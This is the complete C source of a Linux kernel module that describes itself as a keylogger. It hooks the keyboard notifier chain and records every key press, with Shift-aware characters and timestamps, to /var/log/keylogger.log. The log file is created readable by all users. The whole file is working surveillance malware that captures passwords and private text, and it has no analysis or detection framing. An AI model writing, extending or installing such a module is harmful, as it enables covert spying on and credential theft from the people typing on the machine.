#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/input.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/workqueue.h>
#include <linux/timekeeping.h>   // For timestamp

#define LOG_FILE_PATH "/var/log/keylogger.log"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ANUPAMA");
MODULE_DESCRIPTION("Keylogger with actual keys + timestamp");

/*
========================================================
GLOBAL VARIABLES
========================================================
*/

// File pointer for log file
static struct file *log_file;

// Current write position inside file
static loff_t log_file_pos = 0;

// Mutex to avoid multiple threads writing at same time
static DEFINE_MUTEX(log_mutex);

// Track SHIFT key state (pressed or not)
static int shift_pressed = 0;

/*
========================================================
WORK STRUCT (used to defer work safely)
========================================================
*/

struct keylogger_work {
    struct work_struct work;
    int keycode;
};

/*
========================================================
KEY MAP (convert keycode → actual character)
========================================================
*/

static const char *keycode_map[256] = {
    [KEY_A]="a",[KEY_B]="b",[KEY_C]="c",[KEY_D]="d",
    [KEY_E]="e",[KEY_F]="f",[KEY_G]="g",[KEY_H]="h",
    [KEY_I]="i",[KEY_J]="j",[KEY_K]="k",[KEY_L]="l",
    [KEY_M]="m",[KEY_N]="n",[KEY_O]="o",[KEY_P]="p",
    [KEY_Q]="q",[KEY_R]="r",[KEY_S]="s",[KEY_T]="t",
    [KEY_U]="u",[KEY_V]="v",[KEY_W]="w",[KEY_X]="x",
    [KEY_Y]="y",[KEY_Z]="z",

    [KEY_1]="1",[KEY_2]="2",[KEY_3]="3",[KEY_4]="4",
    [KEY_5]="5",[KEY_6]="6",[KEY_7]="7",[KEY_8]="8",
    [KEY_9]="9",[KEY_0]="0",

    [KEY_SPACE]=" ",
    [KEY_ENTER]="\n",
    [KEY_TAB]="\t",

    [KEY_DOT]=".", [KEY_COMMA]=",",
    [KEY_MINUS]="-", [KEY_EQUAL]="=",
    [KEY_SLASH]="/", [KEY_BACKSLASH]="\\",
    [KEY_SEMICOLON]=";", [KEY_APOSTROPHE]="'",
    [KEY_LEFTBRACE]="[", [KEY_RIGHTBRACE]="]",
    [KEY_GRAVE]="`",

    // Special keys
    [KEY_BACKSPACE]="[BACKSPACE]",
    [KEY_ESC]="[ESC]",
    [KEY_CAPSLOCK]="[CAPS]",
};

/*
========================================================
WRITE FUNCTION (writes data into file safely)
========================================================
*/

static void write_to_log(const char *str, size_t len)
{
    mutex_lock(&log_mutex);

    if (log_file && !IS_ERR(log_file)) {
        kernel_write(log_file, str, len, &log_file_pos);
    }

    mutex_unlock(&log_mutex);
}

/*
========================================================
WORK FUNCTION (runs outside interrupt context)
========================================================
*/

static void keylogger_work_func(struct work_struct *work)
{
    struct keylogger_work *kl_work =
        container_of(work, struct keylogger_work, work);

    char buf[128];
    int len;
    const char *key_str = NULL;

    struct timespec64 ts;

    /*
    ----------------------------------------------------
    GET CURRENT TIME
    ----------------------------------------------------
    */

    ktime_get_real_ts64(&ts);

    /*
    ----------------------------------------------------
    GET KEY STRING FROM MAP
    ----------------------------------------------------
    */

    if (kl_work->keycode < ARRAY_SIZE(keycode_map))
        key_str = keycode_map[kl_work->keycode];

    /*
    ----------------------------------------------------
    HANDLE SHIFT (uppercase)
    ----------------------------------------------------
    */

    if (key_str) {

        if (shift_pressed &&
            key_str[0] >= 'a' && key_str[0] <= 'z') {

            char upper = key_str[0] - 'a' + 'A';

            len = snprintf(buf, sizeof(buf),
                "[%lld.%09ld] %c\n",
                ts.tv_sec, ts.tv_nsec, upper);

        } else {

            len = snprintf(buf, sizeof(buf),
                "[%lld.%09ld] %s\n",
                ts.tv_sec, ts.tv_nsec, key_str);
        }

    } else {

        // Unknown key
        len = snprintf(buf, sizeof(buf),
            "[%lld.%09ld] [UNK:%d]\n",
            ts.tv_sec, ts.tv_nsec, kl_work->keycode);
    }

    /*
    ----------------------------------------------------
    WRITE TO FILE
    ----------------------------------------------------
    */

    write_to_log(buf, len);

    kfree(kl_work);
}

/*
========================================================
KEYBOARD NOTIFIER (this gets called on every key press)
========================================================
*/

static int keylogger_notify(struct notifier_block *nblock,
                            unsigned long code, void *data)
{
    struct keyboard_notifier_param *param = data;

    if (code == KBD_KEYCODE) {

        /*
        ------------------------------------------------
        HANDLE SHIFT PRESS/RELEASE
        ------------------------------------------------
        */

        if (param->value == KEY_LEFTSHIFT ||
            param->value == KEY_RIGHTSHIFT) {

            shift_pressed = param->down;
            return NOTIFY_OK;
        }

        /*
        ------------------------------------------------
        ONLY LOG KEY PRESS (not release)
        ------------------------------------------------
        */

        if (param->down) {

            struct keylogger_work *kl_work;

            kl_work = kmalloc(sizeof(*kl_work), GFP_ATOMIC);
            if (!kl_work)
                return NOTIFY_OK;

            kl_work->keycode = param->value;

            INIT_WORK(&kl_work->work, keylogger_work_func);

            schedule_work(&kl_work->work);
        }
    }

    return NOTIFY_OK;
}

/*
========================================================
REGISTER NOTIFIER
========================================================
*/

static struct notifier_block keylogger_nb = {
    .notifier_call = keylogger_notify
};

/*
========================================================
INIT FUNCTION
========================================================
*/

static int __init keylogger_init(void)
{
    log_file = filp_open(LOG_FILE_PATH,
                         O_WRONLY | O_CREAT | O_APPEND,
                         0644);

    if (IS_ERR(log_file)) {
        pr_err("Keylogger: Failed to open log file\n");
        return PTR_ERR(log_file);
    }

    register_keyboard_notifier(&keylogger_nb);

    pr_info("Keylogger loaded\n");
    return 0;
}

/*
========================================================
EXIT FUNCTION
========================================================
*/

static void __exit keylogger_exit(void)
{
    unregister_keyboard_notifier(&keylogger_nb);

    flush_scheduled_work();

    if (log_file && !IS_ERR(log_file))
        filp_close(log_file, NULL);

    pr_info("Keylogger unloaded\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);
